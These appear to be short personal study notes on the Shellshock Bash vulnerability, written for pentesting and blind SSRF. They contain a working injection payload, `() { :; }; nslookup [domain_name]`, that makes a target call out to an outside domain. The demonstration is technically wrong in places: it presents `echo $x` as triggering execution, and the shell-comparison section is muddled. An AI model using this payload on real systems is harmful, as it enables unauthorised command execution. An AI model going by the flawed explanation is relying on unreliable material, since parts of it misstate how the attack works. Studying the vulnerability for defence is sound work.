- Shellshock is effectively an **RCE** Vulnerability in `BASH`.
- The vulnerability relies in the fact that BASH *incorrectly executes trailing commands* when it imports a function definition stored into an environment variable.
- Bash versions <= 4.3 are **vulnerable** to this.
- The vulnerability is present during copying the *environment variables* to `BASH`


##### What's the difference between` /bin/bash -c "echo dhruv"`  AND  `echo dhruv`?
The difference between `/bin/bash -c "echo dhruv"` and `"echo dhruv"` lies in the way the command is executed and the shell environment in which it runs.
1.  `/bin/bash -c "echo dhruv"`
    -   This command explicitly specifies the path to the Bash shell (`/bin/bash`) and uses the `-c` flag to provide a command (`echo dhruv`) as an argument to be executed.
    -   The command is executed within the Bash shell environment, regardless of the default shell of the user.
    -   This is useful when you want to ensure that the command is executed using Bash, regardless of the default shell set for the user or system.
2.  `"echo dhruv"`
    -   This command relies on the default shell specified for the user or system. It doesn't explicitly invoke the Bash shell.
    -   The command is executed within the default shell environment, which may vary based on the user's configuration or the system's settings.
    -   If the default shell is set to Bash, the command will be executed within the Bash environment. Otherwise, it will run in the default shell, which could be a different shell, such as Dash, Korn shell (ksh), or others.


#### Exploit
- Create an *Empty Nameless function* in `Bash Scripting`
```bash
env x="() { :; }; /usr/bin/nslookup [domain_name]";        # Colon(:) means return "True"
OR
export x="() { :; }; /usr/bin/nslookup [domain_name]";

echo $x
... [Command Execution]
```
- This function contains `:`, which means nothing, followed by `;`. This part is used to *bypass syntax restrictions* and ensure the vulnerability triggers.
- Since it executes trailing commands, all commands entered after the function will get executed!

- If shell is `BASH` by *default*
```bash
export x="() { :; }; nslookup [domain_name]";
```


You can use this exploit during #blindssrf